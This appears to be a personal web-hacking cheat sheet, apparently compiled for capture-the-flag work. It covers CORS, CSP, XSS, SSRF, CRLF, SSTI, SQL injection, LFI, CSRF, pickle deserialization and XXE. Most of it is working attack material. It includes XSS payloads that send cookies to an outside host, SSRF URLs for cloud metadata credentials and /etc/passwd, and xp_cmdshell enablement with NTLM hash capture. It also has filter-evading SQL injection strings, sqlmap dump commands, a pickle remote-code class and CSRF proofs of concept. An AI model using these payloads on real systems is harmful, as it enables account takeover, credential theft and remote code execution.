%WEB%

# Bioler Plate

* what is?
* Reason
* Impact
* How to find
* Exploiting
* Smart Attack vectors


# Headers

## Content-Type

**This literally can do magic**<br/>
**Try to extract every content-type that webApp accept in file Uploader, post , get requests etc.**

```
	Content-Type: application/json
	Content-Type: application/x-shockwave-flash
	Content-Type: application/js
	Content-Type: application/xml
	Content-Type: application/x-www-form-urlencoded
```

**This can help us to bypass many checks like example look at the code**

```
	x = req.body.data;
	if(x.length>1){
		console.log("fuck , u cant win");
	}else{
		if(x=="123"){
			console.log("Nice bypass, Well in JS "123"==["123"] :P ");	
		}else{
			console.log("Nice try");
		}
		
	}
```
**Now to bypass this if we send data : <br>
`Content-Type: application/x-www-form-urlencoded` and `data=123` <br>
we will loose, so knowing if other content types are acceptable , we can use it like, <br>
`Content-Type: application/json` and `{data:[123]}` <br>
 we bypass length check and also `"123" == ["123"]` .**

**Lets take challenge to next level**
```
	const regex = /[<>]/;
        
  if(regex.test(req.body.name)){
      res.send("damn, You cant have brackets boy");
  }else{
      console.log("well, here is response that i'll directly render into web-page bcz you are baby whos brackets are exposed");
      body.html(req.body.name)
  }
```
>Now , obviously the task is to call body.html with `<>` tag , but sure enough these tags are regexd .<br />
<br/>
**So a simple solution will be use `Content-Type: application/json` to send json data as <br />
`curl -X POST -H "Content-Type: application/json" --data '{"name":{"a" : "here<script>"}}'` <br/>
and this will bypass the filter as name is now a object not a string  .**


**If an file uploader allows `Content-Type: text/xml` we can upload SWF which can be used for SOP bypass , XSS , Open redirect , and leak CSRF token etc. I have a xss.swf for it .**


## Acess-Control-Allow-Origin(ACAO)

### what is?

### Reason

This can be due to many reasons like:

* Misconfigured CORS
* bad config of crossdomain.xml
* Bypassing Server checks

### Impact

This Can be used to 

* Full Acc. takeover if Access-Control-Allow-Credentials: true 
* CSRF Token hijacking
  etc


### How to find


```
curl https://test.victim.com/api/requestApiKey -H "Origin: https://evil.com" -v
```
And check the response if Origin is reflected in the response in ACAO.

**Other types :** 

* POORLY IMPLEMENTED, BEST CASE FOR ATTACK:
```
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

* POORLY IMPLEMENTED, EXPLOITABLE:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

* BAD IMPLEMENTATION, Very Very hard mostly unexploitable:
```
Access-Control-Allow-Origin: *
```

### Exploiting
```
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://test.victim.com/api/requestApiKey',true);
	req.withCredentials = true;
	req.send();
```

### Smart Attack vectors
```
> Origin : https://www.attacker.com

> Origin : https://www.site.com

> Origin : https://test.site.com

> Origin : https://www.site.com.attacker.com

> origin : https://www.site.com attacker.com

> origin : https://site.com`+=.evil.com
```


### MORE ON

* [CORS DETAILED](./docx/corsAttack.pdf)

## X-Forwarded-For | X-Real-IP

### what is?
More like IP-Addr Spoofing. <br/>
This header is basically what usually progamming language use to determine the IP of incomming request.

### Impact:
Can be used to access blocked Pages which are only allowed by internal/specific IP-Addr.

### How To Find
```
GET / HTTP/1.1
Origin: 192.121.22.45
X-Forwarded-For: 192.121.22.2
or
X-Real-IP : 127.0.0.1
```

### Exploiting
use CTS(critical thinking skills) now to find its value, usually something from the network, or localhost or some trusted 3rd party site is using etc

### Smart attack vectors
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.1.1
X-Forwarded-For: 0
X-Forwarded-For: 0.0.0.0
X-Forwarded-For: 2130706433
IPv6 etc
```


## HSTS

**HTTP strict transport security** 
Used to tell browser to make request only using https.

`Strict-Transport-Security: max-age=153231670; includeSubdomains; preload`

poosible attack : TOFU , first request ever made to site is insecure nd prone to mitm

## HPKP

**HTTP Public Key Pinning (HPKP)**


## X-Frame-Options

Prevents click jacking but obfusgated. click jacking can also be prevented using csp header

## Cache-Control

Browser caches this request 

`Cache-Control: private, max-age=1670;` 

## X-XSS-Protection

THis was used to block browsers xss filter lol.



## Content security policy(CSP)

### what is?
This policy is mainly used to control the source of execution scripts like, allowing scipt to be executed only if they are from currentSite and disallow inline script , or iframe only of specific sites, styles tag served only from cloudflare or certain vendors.<br>

*Basically disallowing running untrusted execution script*

### How To Find
```
GET / HTTP/1.1
Origin: 192.121.22.45
Content-Security-policy: POLICY-LIST
```

Take the policy and paste@ https://csp-evaluator.withgoogle.com/ <br/>
example policy,
```

default-src 'none';
script-src 'nonce-23434534' 'strict-dynamic';
style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
img-src 'self';
connect-src 'self';
frame-src https://www.google.com/recaptcha/;
form-action 'self';

```
copy all these into https://csp-evaluator.withgoogle.com/, and u will find 2 vulneribilities, base-uri missing i.e `<base>` tag attack, and self in script missing so `script-src attack`


### Smart attack vectors

* Missing `base-uri` in CSP 

>Note! Its possible when there is HTML Injection in head and site uses relative URL and injection need to be in head for `<base>` tag

If the scripts are loaded as `<script src='/app.js' nounce=1231231231>` and csp only allows to load script with nounce , using html injection we can add
`<base src='https://evil.com'>`<br>
and then scripts will be loaded from our url now

* Exploiting `Missing script-src self`
>Since script-src is not limited to self, we can load javascript from our own website. Additionally, we can even dynamically load javascript from specify URL.

```
exploit = <script src=http://example.com/evil.js>
```
will just fetch content of evil.js from our server as self is not mentioned in CSP.

> Doesnt work on New Browsers 
https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs

================================================================================================

# GraphQL injection and enumeration

## What is?

GrpaphQL is query language used by server and database to communicate .

## Reason

GrpaphQL works this way, implementation of grpahQL properly isnt easy and same goes with authenticates routes , its not ez  so there are many problems .

## Impact

* Can leak whole database, bcz a graphQL query takes table to query and what columns to query to display and filter we want, so we can change this query just the way we wanted
* It does takes filter to put on the query which can be exploited just like normal injection

## How to find?

A valid quey may look like:

query= { TableToQuery(filter) { column1,column2 } }

> here filter is option and can be simply { TableToQuery { column1,column2 } }

So whenever you see such query try changing tableNames column etc .
[some comman tables like user, admin, etc can be tried]

and best part is sometimes does auto suggestion which just makes it easier. we will se in exploting wht i mean by tht.

## Exploiting

### Method 1

suppose you find a endpoint with no knowledge wht query should be passed so lets begin there

testing if its valid endpoint
```
> query={}     

<  {"errors":[{"message":"Syntax Error GraphQL request (1:2) Expected Name, found }\n\n1: {}\n    ^\n","locations":[{"line":1,"column":2}]}]}
```
Yes, So valid endpoint. Now lets see the `suggestion thing i was trying` <br />
we dont know tablename but if we guess few prefix of tablename it suggests do you mean this which just tells actual name

```
> query = { us }

< {"errors":[{"message":"Cannot query field \"us\" on type \"Query\". Did you mean \"user\"?","locations":[{"line":1,"column":2}]}]}
```

Oh yes i meant user lol

```
> query = { user }

<  {"errors":[{"message":"Field \"user\" of type \"User\" must have a selection of subfields. Did you mean \"user { ... }\"?","locations":[{"line":1,"column":2}]}]}

```

Great now we need columns in this table, and well autosuggestion to rescue

```
> query={user {user} }

< {"errors":[{"message":"Cannot query field \"user\" on type \"User\". Did you mean \"username\"?","locations":[{"line":1,"column":8}]}]}
```

Yes i need username

```
> query={user {username , pass} }

< {"errors":[{"message":"Cannot query field \"pass\" on type \"User\". Did you mean \"password\"?","locations":[{"line":1,"column":8}]}]}
```
Yes password it is
```
> query={user {username , password} }

< {"data":{"user":{"username":"helpme@helpme.com","password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```
TADA , this is one way and not injection.. lets see how injection happens and that happend at filters usually.<br/>


suppose the above query didnt worked and we can only query username

```
> query={user {username} }
< {"data":{"user":{"username":"helpme@helpme.com"}}}
```


### Method 2

```
/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
```

this might dump schema of every table with columns..

look for definations of table/connections:
```
This is how a single table defination is to search for

{
	"kind": "OBJECT",
	"name": "",
	"description": null,
	"fiels" : [
		this is where we fields what we can query
	]
}

```
and make way as mentioned in video

## Smart Attack Vectors


# XSS

## What is?


## Reason

Render user input ` without validation ` or `Bad Validation`. 

## Impact

* Full account takeover(Session hijacking) [if httpOnly flag is not set]
* token extracting
* RCE on some browsers

## How to find?

Whenever you see a user input is rendered anywhere in the code , That can be potential place to try xss.

ex:
```
Payloads like <svg/onload=alert`1`> in every input field
Requesting like site.com/#<svg>
```

## Exploiting

```
<svg onload=fetch('//HOST/?cookie='+document.cookie)>
<svg onload=”document.body.innerHTML='<img src=//HOST/IMAGE>'”>
<iframe src=//HOST/ style=display:none></iframe>
<script src=//HOST/SCRIPT></script>
```

## Smart Attack Vectors

### Using `__proto__` to included blacklist values in object

**Object proto property .**
```
t = {}
userInput = [ INPUTHERE ]
if(Object.keys(userInput).length!=0){
	console.log("Sorry u cannot have this value in input");
}else{
	t = {...t,...userInput};
}
if(t.thisCannotExist){
	console.log("How did u get this here?");
}

```
**So input cannot have `thisCannotExist` key .**

> Bypass is simple. `userInput = {'__proto__' : { 'thisCannotExist' : 'yo' } }`.


### Hard filters


**Injecting is inside Javascript, so out data is reflected in JS .**

`/ put the content to next line `

> `(alert)(23)//` 
> `"/(alert)(23)//`

** Injection when we can inject into html but cant get xs bcz of string waf

WAF blocking **Spaces**,**onload=alert()**

> `<dEtAiLS%09OnpoinTEreNtER%0D=%0Da=prompt,a()%20x>`
> `<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>`
> `<img/src='1'/onerror/=console.log`1`/>`

### Local file read 

**We can have local file read from xxs as :**

```
<object data="file://C:/windows/win.ini">
<iframe src="file:///C:/windows/win.ini">
<embed  data="file://C:/windows/win.ini">
<img src="file:///C:\Program Files\Internet Explorer\images\bing.ico" />

```


### Look into XSS.md



# SSRF and URL Bypasses


## What is?

![alt](./images/ssrf.png)

SSRF (Server side request forgery) refers to an attack where in an attacker asks the server to fetch a URL for him. 
SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network. Additionally, it's also possible for an attacker to leverage SSRF to access services from the same server that is listening on the loopback interface (127.0.0.1).

## Reason

Bad validation or no validation at all by server of user input before making request to any `URL`.<br />
Also inconsistency in urlparsers/urlrequester makes it very difficult to validate url as in python urllib and requets may use totally diffirent approch to get url(see below in exploit part).<br />

A valid URL accroding to RFC :
![alt](./images/validUrl.png)


## Impact

> Larger the serives on intranet, severe the attack.

* Access pages that are accessible only on intranet/locally
* Do a port scan
* Protocol smuggling makes SSRF Super dangerous , done with CR-LF etc
* Xss ,if site.com render output of request
* Bypass firewall/waf to sqli
* Compromising Intranet 
	* struts, elactic stack, jira , FTP, SMTP , redis, memcache etc
* Getting Cloud Meta-data:
	* AWS : http://169.254.169.254/latest/meta-data/hostname , http://169.254.169.254/latest/user-data , http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role

	* Google cloud : "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"

## How To find?

Our goal is to find if a server made a request to us or not. Ex `example.com/?u=https://beeceptor.com/`.<br/>

> Sites like https://beeceptor.com/ are used to log request made to it. so if site.com makes a request to url https://beeceptor.com/ going to console provided by https://beeceptor.com/ will show request.

> Look into following :
* webhooks
* dynamic pdf generator
* request to fetch image/asset url



## Exploiting

For exploiting we maily target scheme/authority/path in URL
![alt](./images/attackURL.png)

> Some Bypasses:


> PHP
```
$URL = http://google.com#@evil.com 
$host = parse_url($URL)['host'];
if($host=='google.com'){
	readfile($URL);
}
```
readfile will fetch evil.com whereas parseURL gives host as google.com


> CURL 
```
http://foo@evil.com:80 @google.com/
will make request to evil.com and many languages use curl to make requets
```
SO 
* php    > parse_url
* nodeJS > url 
* Perl   > uri
* go     > net/url
* ruby   > addressUrl

all these function in these language find google.com as domain but for curl its evil.com and curl is mostly used to make requst

```
Python:
url="http://1.1.1.1 &@2.2.2.2# @3.3.3.3/"
urllib.request.urlopen(URL) 	<= makes request to 1.1.1.1
request.get(URL)   				<= makes request to 2.2.2.2 
urllib2.request.urlopen(URL) 	<= makes request to 3.3.3.3
```

> Some Explot techniques


```
http://example.com/ssrf.php?url=https://aaaaaaa.free.beeceptor.com

http://example.com/ssrf.php?url=file:///etc/passwd

http://example.com/ssrf.php?url=file:///C:/Windows/win.ini

http://example.com/ssrf.php?dict://evil.com:1337/

http://example.com/ssrf.php?url=sftp://evil.com:1337/

http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit

```


## Smart Attack vector

### IP Bypasses

#### 1
**So lets see ways to bypass checks to include IP address .**

```
userInput = [ INPUTHERE ]
if (userInput && userInput.value.indexOf('.') == -1 && userInput.value.indexOf("//") == -1 && userInput.value.indexOf("。") == -1 && userInput.value && typeof(userInput != 'object')) {
        if (userInput.type == "img") {
            <img src=[INPUTHERE] />
        } else {
            alert("-_-");
        }
    }
```
>The bypass is :` { value : "\\\\1869573999" } `

* **So there are 2 checks input cannot have `.(dot)` and `//` preventing us to write http://any[dot]com**

* **`//` can be bypassed using one of chrome features - putting double backslash `\\\\`(we need 2 backslash so 4 bcz 1 escape other) as a URL prefix will be replaced with current schema - so http://. What's worth to mention, it works like this only on linux. In windows version of chrome \\ is replaced with file:// .**

* **Cannot have `.`(dot) -_-. `1869573999` is decimal representation of IP address . Ip address can be represented as hex,decimal,oct binary. so in decimal looks like `http://3512041827/` octal looks like `http://0100.0351.0251.0152/` , `http://00C0.00A8.002B.005C` etc .**

#### 2

using IPv6:
```
https://[0:0:0:0:0:ffff:127.0.0.1]
https://[::ffff:127.0.0.1]/
https://[0:0:0:0:0:ffff:127.0.0.2]
https://[::ffff:7f00:1]
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
'http://[::ffff:a9fe:a9fe]

```

### Time of check time of use

```
url = userSuppliedURL;
r = gethostbyname(url);   <= retrieves 1.2.3.4, time of check

we change DNS entry for foo.com to point to 127.0.0.1

reques(url)               <= url entry now points to 127.0.0.1 , thus at time of use we get localhost

```


### 302 redirect
Use 302 redirection to change scheme from http/https to any other scheme like file, gopher etc. or bypass restricted IP's

```
url = "site.com/index.php"

r = checkIfNotLocalhost(url); // proper check, not bypassable
if( r ){
	// so url is not localhost, make request now.
	response = request("get", url);
	res.send(response);
}else{
	// cannot have localhost
}
```

> so we can use 302 redirects, to redirect SERVER => site.com/index.php[302 redirect to localhost] => SERVER(localhost)

*site.com/index.php source code*
```

header("location: http://[::]:PORT/");

```

so when server visit index.php, its redirected to itself, just SSRF.

### CURL + PHP 

url = file://127.0.0.1@www.google.com:443/flag%23

so for php
```
php > print_r(parse_url("file://127.0.0.1@www.google.com:443/flag%23"));
Array
(
    [scheme] => file
    [host] => www.google.com
    [port] => 443
    [user] => 127.0.0.1
    [path] => /flag%23
)
```
> and for curl: it will make request to file://127.0.0.1/flag# , meaning /flag and `not` document_root/flag

### Using comments & Path normalization

```

$url = $_GET['url'];

$parsed_url = parse_url($url);

if( $parsed_url["host"] === "www.google.com" && $parsed_url["port"] === 443 ){
	$url = $url + "/?q=hello";
	echo curl.get($url);
}
```

> sol1. : file://127.0.0.1@www.google.com:443/etc/hosts#
> sol2. : file://www.google.com:443/../../../../../../../etc/hosts#

here sol2 shows how we can normalize path to /etc/hosts and use `#` to bypass `$url + "/?q=hello";`



# Protocol smuggling(CR-LF)

## what is?
## Reason
## Impact
## How to find
## Exploiting
## Smart Attack vectors 

### NODE CRLF
Node JS bypass in http library due to stripping \xff from unicode strings<br/>
suppose in node
```
f = userInput;
if(f.indexOf("\n")==-1 &&  f.indexOf("\r")==-1){
	http.get(f);
}
```
so, %0a(\n) and %0d(\r) is blocked , but <br />
`U+FF0D` is `－` <br />
and `U+FF0A` is `＊` 

and if `ff` is stripped from `U+FF0D` we get `0D` and tht is `\r` <br />

**so userInput : `site.com/－＊ SLAVEOF@orange.tw@6379` and http will strip `ff` and we get `\r\n` and thus protocol smuggle**

### Injections

```
http://127.0.0.1:333/lang=en%0a%0d, <= usually lang is reflected in cookie so TIP
http://127.0.0.1:333/pa\rth,
http://127.0.0.1:333/pa\nth,
http://127.0a.0.1:333/pa\r\nth,
http://127.0.0.1:333/path?param=foo\r\nbar,
http://127.0.0.1:333/path?param=foo\rbar,
http://127.0.0.1:333/path?param=foo\nbar,
http://127.0.0.1:333/pa%0dth,
http://127.0.0.1:333/pa%0ath,
http://127.0a.0.1:333/pa%0d%0th,
http://127.0.0.1:333/pa%0D%0Ath,
http://127.0.0.1:333/path?param=foo%0Abar,
http://127.0.0.1:333/path?param=foo%0Dbar,
http://127.0.0.1:333/path?param=foo%0D%0Aba"
```


# SSTI

## What Is?


## Proagramming Language based atacks vectors

**check payloads in payloadandallthing**

### RUBY

* <%= 7 * 7 %>
* <%= File.open('/etc/passwd').read %>

### Angular
	
* `{{5*5}}`
* `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}` for Versions 1.3.0-1.5.7
* `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}` for Versions 1.2.20-1.2.29
* `{{c=toString.constructor;p=c.prototype;p.toString=p.call;["a","alert(1)"].sort(c)}}` for 1.2.19
* `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}` for 1.2.6 - 1.2.18
* `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}` for 1.2.0 - 1.2.5

### Python

Look into  file:
* "/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/python/Jinja2\ template\ injection.pdf"
* "/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/python/ssti \python"


# Fuzzing

## How to fuzz

**Fuzzing is the rank 2 thing we should start after RECON. But this will need us to think differently, exploiting web app is not hard, finding bug is hard.**

**Imagine this scenario : you want to buy a shirt for your friend, now what things will you keep in mind ? <br/> Size? color? this is linear thinking <br /> think shirt as a object, what things will it contain? <br /> collar,size,color,fullarm/halfarm ? etc .** <br />

**This approch to think in multi direction is needed, lets apply it to our scenario now. .**


# Race Condition

If you can manipulate : TIme of CHECK, TIme OF use.
Example : `/Users/Aman/Desktop/ctf/____reminder____/web\ expoliting/raceCondition\ Basic.htm`


# Rate Limiting

## what is?

Limiting the number of requests made from client to server to avoid brute forcing things like username, OTPs, Passwords etc 

## Reason
## Impact
## How to find
## Exploiting
## Smart Attack vectors

* Using `X-Forwarded-For: random` can be used to sometime bypass rate limiting.


# SQL Injection


## MSSQL Injection

[if stacked queries are enabled]

* Configuration mssql for xp_cmd
```sql
> EXEC sp_configure 'show advanced options',1;RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```
* performing xp_cmdshell : `xp_cmdshell 'whoami';`
* performing samba request to a Responder.py to extract NTLM hash of the samba user : `> declare @a varchar(200);set @a='\\10.10.10.10\smbShare';exec master.dbo.xp_dirtree @a;` [giddy ippsec]



## sqlite injection with not allowed > spaces ' " union select

* `%0a` to make spaces
* `unUnionion` string cutting because it was replacing our input

> get table names
```
?id=1%0aununionion%0aselselectect%0a1,2,group_concat(tbl_name)%0afrom%0asqlite_master--
```
> get column names
```
?id=1%0aununionion%0aselselectect%0a1,2,group_concat(sql)%0afrom%0asqlite_master--
```

## procedure analyses to get column name

```
SELECT id, name, pass FROM users WHERE id = x  LIMIT 1,1  PROCEDURE ANALYSE() --
```
## 1%0 trick and MySQL subqueries

**USE IT WHEN**
* **Tbl name is known+ columns is not null**

>Ok, imagine you have the table USER_TABLE. You don’t have any other informations than the table’s name.
The sql query is expecting only one row as result.

Here is our input:
` AND (SELECT * FROM USER_TABLE) = (1)––`

MySQL answer:
**Operand should contain 7 column(s)**

MySQL told us that the table USER_TABLE has 7 columns! That’s great!

Now we can use the UNION and 1%0 to retrieve some column’s name:

The following query shouldn’t give you any error:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1,2,3,4,5,6,7 LIMIT 1)–– `

Now let’s try with the first colum, simply add %0 to the first column in the UNION:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1%0,2,3,4,5,6,7 LIMIT 1)–– `

MySQL answer:
**“Column ‘usr_u_id’ cannot be null”**

We’ve got the first column name: “usr_u_id”

Example with the 4th column:
` AND (1,2,3,4,5,6,7) = (SELECT * FROM USER_TABLE UNION SELECT 1,2,3,4%0,5,6,7 LIMIT 1)–– `

## Extracting Column names

![alt](./images/sql1.png)

0′ UNION SELECT version(),null /*
or:
0′ UNION SELECT @@version,null /*


## PAYLOADS

* `'/**/union/**/select/**/flag/**/from/**/flag` 
* `?id=1+%00’union+select+1,2,3′–`  i.e null byte
* `?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—` url encode
* `?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-` url encode
* `?id=-1+uni*on+sel*ect+1,2,3,4–+-` idk how will this work
* `?id=-1/* &id= */union/* &id= */select/* &id= */1,2 —` parameter pollution
* `=1+and(/*!50000select*/ 1)=(/*!32302select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+/*!uNIOn*/+/*!SeLECt*/+1,2,3 –+-` buffer overflow


## advance MySQL table and column names

[LINK TO WRITEUP](./docx/sql1.pdf)

## BLIND Injection

```
Getting database info
> id=1
> id=1' OR LENGTH(database())=6 #   ( get length of name of db)
> id=1' OR database() LIKE '______'#  ( brute force a-Z 0-9 we get database name 'level2' )

```

``` 
Getting tables info
> id=1' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2# count of tables
> id=1' OR (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 6 #  1st table name length 
> id=1' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE '_____'#   ( brute force a-Z 0-9 we get table name 'pages' )
```

Now we can just use sqlmap

`sqlmap -u "http://35.237.57.141:5001/b09a24aa14/fetch?id=2" --method GET --dump -D level5 -T photos --random-agent --threads 10`

OR

Enum database
` sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dbs --dbms mysql --regexp "invalid password" --level 2 `
ENum Table
`sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --table -D level2 --dbms mysql --regexp "invalid password" --level 2`
Dump Table value
`sqlmap -u http://35.237.57.141:5001/352b4bc136/login --method POST --data "username=FUZZ&password=" -p username --dump -D level2 -T admins --dbms mysql --regexp "invalid password" --level 2`




# LFI(Local file inclusion)

## what is?

In this bug we are able to include/require any file controller/uploaded by attacker

## Reason
## Impact
## How to find
## Exploiting
## Smart Attack vectors 

> PHP LFI to RCE(PHP any-7.2)

[LINK TO WRITEUP](./docx/phpsession.pdf)

> this works even with session.upload_progress disabled

__whats session.upload_progress?__

Whenever we upload a file via multipart request example:
```
`curl -X POST -H 'Cookie: PHPSESSID=iamorange' -F 'file=asdf' `
$ ls -a /var/lib/php/sessions/
. .. sess_iamorange
```
so we control a file and its content and this is what session.upload_progress does. It creates a file with name of phpsessionid in /varr/lib/php/sessions/ , if its disabled it doesnt create this file.



# LFD(Local file disclosure)
## what is?

In this bug we are able to read abt file from the server

## Reason
## Impact
## How to find
## Exploiting
## Smart Attack vectors 

# IDOR
# DATA Leak

# CSRF

## What is?

##Reason

There should be a unique token to identify validity of each request made by client to validSite .<br/>
If there is no token , an attacker can just make victim visit a link on victim browser with his cookie but attacker controlled data.<br/>

## Impact

* Account takeover by password reset
* Link users acount to my fb(social) account, thus getting account takeover
* Changing users info,phone number etc

## How to find?

Just look for API's which changes user info and either 
* donot have CSRF token
* less random CSRF token
* not validating CSRF token

## Exploiting 

if site.com/addMyPhoneNumber API is vulnerable to CSRF then create a.html
```
<script>
x = new XMLHttpRequest();
x.open("POST","site.com/addMyPhoneNumber");
x.send({
  number : "attackerNumber"
});
```
send a.html to normal user and this will end up changing normal user name

## Smart attack vectors

* [Detailed attack](./docx/csrf.pdf)

### Unvalidated content-type JSON CSRF

* if Server looking for json formatted data but don’t validate the Content-type. <br/>

> Use Fetch request, as we know in this case server is only checking for the post data if it’s correctly formatted or not, if yes it will accept the request regardless the Content-type is set as text/plain.

```
<center>
<h1> JSON CSRF POC </h1>
<script>
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
</center>
```


### JSON CSRF data validating content-type

**Caused due to misconfigured crossdomain.xml. If in crossdomain.xml allowsites is * , we can perform this attack**

why crossdomain.xml? <br/>
When we want data from xxx.com to evil.com with flash, Flash first check that Xxx.com has crossdomain.xml or not. If there It checks its details Like does it accept evil.com request or not

Attack
```
We create 3 things in our server
php page with 307/302 redirect
Crafted flash file
Crossdomain.xml in root dir of ur site
``` 
* we create a crossdomain.xml in our evil.com with wildcards `allowsites:*`
* Now lets make flash file
![alt](./images/flash.jpeg)
! here test.php is our php which we will create on our server with contents as
```
<?php
 
// redirect automatically
 
header("Location: https://victim.com/user/endpoint/", true, 307);
 
?>

```
307 redirect to redirect without changing anything in body

* embed this flash in html

> User opens html, get redirected to out test.php with content mentioned in flash file, our test.php will redirect that request to `victim/user/endpoint` with SOP bypass


### Not using `state` for oauth

For Facebook login oauth flaw if site is not using “state” parameter which is used to protect against CSRF attack, so even while adding social account from applications users setting same flawed oauth implementation is used.

### Using CSRF token accross account

Using same CSRF token of 1 account on another

### Same length and sum

Keeping length of token and SUM same. like ABC have:
* length 3
* A+B+C = 61+62+63 = 186

SO a token like CAB,CBA etc.

### Removing token entirely

remove the token entriely from the request

### Decoding Token

If token is MD5,or base64 or something, just decode it and see.


# Python 

## general files to bruteforce 

> get /proc/self/cmdline can leak the location where the python app is loaded 

```
>  url=file:///proc/self/cmdline

<  uwsgi --socket 0.0.0.0:8000 --module rwctf.wsgi --chdir /usr/src/rwctf --uid nobody --gid nogroup --cheaper-algo spare --cheaper 2
```

so working directories are : /usr/src/rwctf

actual places where to look for below mentioned files are `/usr/src/rwctf/rwctf/settings.py` , `/usr/src/rwctf/admin/settings.py` etc

* `__init__.py`
* `urls.py`
* `settings.py`
* `apps.py`
* `views.py`


## Deserialization

>Suppose the task is simply read `flag.txt`

```
x = cPickle.dumps(raw_input())
try:
	out = cPickle.loads(base64.b64decode(x))
except:
	pass

response.send(out)
```

**So it takes out input and does dumps on it so we dont have to do it**

>solution

```
class PickleRce(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.getoutput,('cat flag.txt',))

out = PickleRce()

```

## python flask url checks bypass

```
from  werkzeug.urls import url_parse

@app.route('/xyz'):
	
	postdata = app.request.post("url")
	scheme, netloc, path, query, fragment = url_parse(postdata)
	if path.startsWith("/cannotViewThisPage"):
		return None
	else:
		request.get(postdata,allow_redirects=False) # if this is true , just redirect and get

@app.route('/cannotViewThisPage'):
	if request.remote_addr != "127.0.0.1":
			// if request not comming locally, fuck him
			return "Fuck off"
	else:
		print "you win"
```

> ok so task is simple, we need "you win"
payload
```
POST site.com/xyz

url=http://localhost///cannotViewThisPage
```

so `url_parse` will return path of `http://localhost///cannotViewThisPage` as "///cannotViewThisPage"
which indeed dont start with "/cannotViewThisPage" and when request module makes reques, python django will hit /cannotViewThisPage


## Weird python url handing

```
from flask import Flask     
app = Flask(__name__)       

@app.route("/test")         
def test():                 
    return "Hello test!"    

if __name__ == "__main__":  
    app.run()               
```

> curl localhost:5000/test  <== 200 OK 
> curl localhost:5000//<wht>/test  <== 200 OK....  DOnt know why

## Python "a""b" is "a"+"b"

**Well  if in python + is blocked , we can just use this trick to append strings .**

## Python3 f''

https://github.com/p4-team/ctf/tree/master/2018-07-13-meepwn-ctf/web_pycalcx#pycalcx2-54-solved-100p

```
FLAG = "hello"
source = raw_input()

f'Tru{FLAG<source or 14:x}'  

```
* We use the short circuit `or` to get one of the two results, depending on the result of comparison `FLAG < source`, i.e , `True or 14` returns True and False or 14 returns 14.
* We use x modifier to turn 14 into hex digit e
* `Tru{FLAG<source or 14:x}` therefore evaluates to either `Tru1` or `True`, depending on the FLAG>source condition


# XML injection

# XXE(XML external entity injection)

## what is?

So when XML from attacker is parsed on web server without validations, it can allow attacker to inject and run xml code which can lead to file read, ssrf etc.

Normal XML
```
<?xml version="1.0">
<Root>
	<Value>1234</Value>
</Root>
```

XML with Entity declared inside a DTD
```
<?xml version="1.0">
<!DOCTYPE Root [
	<!ENTITY name "value">
]>
<Root>
	<Name>&name;</Name>
